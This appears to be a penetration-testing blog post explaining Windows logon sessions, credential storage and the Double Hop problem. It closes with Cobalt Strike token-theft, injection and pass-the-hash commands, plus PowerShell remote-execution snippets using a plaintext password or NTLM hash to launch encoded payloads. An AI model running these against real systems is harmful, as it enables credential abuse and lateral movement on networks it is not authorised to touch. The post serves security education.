---
layout: post
title: Windows Credential Management, Logon Sessions and the Double Hop Problem
date: '2019-04-12 00:00:00'
categories: ['Red Team', Windows]
tags: []
---

I wanted to provide a quick overview on Windows credential management in relation to penetration testing, why passwords are not always stored in memory and the Double Hop problem.

Windows creates a [logon session](https://docs.microsoft.com/en-us/windows/desktop/SecAuthN/lsa-logon-sessions) upon a successful authentication. Each logon session will be backed by several authentication packages. These authentication packages store the credential material. The logon type and protocol will determine what credential material gets stored.

All processes and threads have an access token that is tied to a logon session. If a process or thread wants to execute in a different security context than it must acquire the appropriate access token. This concept is called impersonation.

During a Network logon (type 3 - e.g. WMI, PsExec, SMB, etc) the client proves they have credentials but does not send them to the target. A logon session is created but no sensitive credential material will exist on the target. Processes or threads which have an access token tied to this logon session **will not** be able to authenticate to network resources within the context of the user. This is often termed the Double Hop problem.

During an Interactive (local console) or Remote Interactive (RDP) logon (types 2 and 10 respectively) the client sends the credentials to the target. The credentials are now stored within the credential material of an authentication package for that logon session. Processes or threads which have an access token tied to this logon session **will** be able to authenticate to network resources within the context of the user.

On a side note, if you have even wondered how the Mimikatz _sekurlsa::logonpasswords_ command works, it iterates over all logon sessions and dumps the credential material in each default authentication package.

You can solve the Double Hop problem by acquiring an access token for a logon session (impersonating) or injecting code into a process that contains the required access token. In Cobalt Strike this would be the commands:

```plaintext
steal_token [pid] inject [pid] \<x86|x64\> [listener] shinject [pid] \<x86|x64\> [/path/to/shellcode.bin] spawnu [pid] [listener]
```


If no logon sessions exist with the credential material you require, you can create one using the Cobalt Strike commands:

```plaintext
make_token [DOMAIN\user] [password] pth [DOMAIN\user] [HASH] spawnas [DOMAIN\user] [password] [listener]
```
Lastly you can directly pass the credentials to the tool performing the network operations like so:

```


```powershell
$pass = ConvertTo-SecureString 'Winter2019' -AsPlainText -Force;
$cred = New-Object System.Management.Automation.PSCredential('DOMAIN\Account', $pass);
Invoke-WmiMethod -Credential $cred -ComputerName "Target" win32_process -name create -argumentlist 'powershell -ep bypass -noP -enc JABjACAAPQA...'

Invoke-Command -Credential $cred -ComputerName "Target" -ScriptBlock {powershell -ep bypass -noP -enc JABjACAAPQA...} 
# https://github.com/Kevin-Robertson/Invoke-TheHash 
Invoke-SMBExec -Target Target -Domain DOMAIN -Username Account -Hash FFB91205A3D288362D86C529728B9DC0 -Command "powershell -ep bypass -noP -enc JABjACAAPQA..." -Verbose 

Invoke-WMIExec -Target Target -Domain DOMAIN -Username Account -Hash FFB91205A3D288362D86C529728B9DC0 -Command "powershell -ep bypass -noP -enc JABjACAAPQA..." -Verbose
```

Hopefully this gives you a better understanding of when you are allowed to authenticate to network resources during a penetration test.
